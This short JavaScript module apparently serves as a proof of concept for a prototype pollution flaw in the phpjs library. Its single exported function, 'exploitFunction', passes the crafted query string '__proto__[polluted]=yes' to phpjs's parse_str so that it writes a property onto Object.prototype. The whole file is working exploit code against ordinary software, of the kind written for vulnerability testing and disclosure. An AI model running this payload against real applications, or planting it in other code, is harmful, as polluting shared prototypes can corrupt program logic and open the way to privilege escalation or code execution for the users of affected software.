function exploitFunction(payload) {
    const p = require("phpjs");
    p.parse_str("__proto__[polluted]=yes", payload);
}

module.exports = { exploitFunction };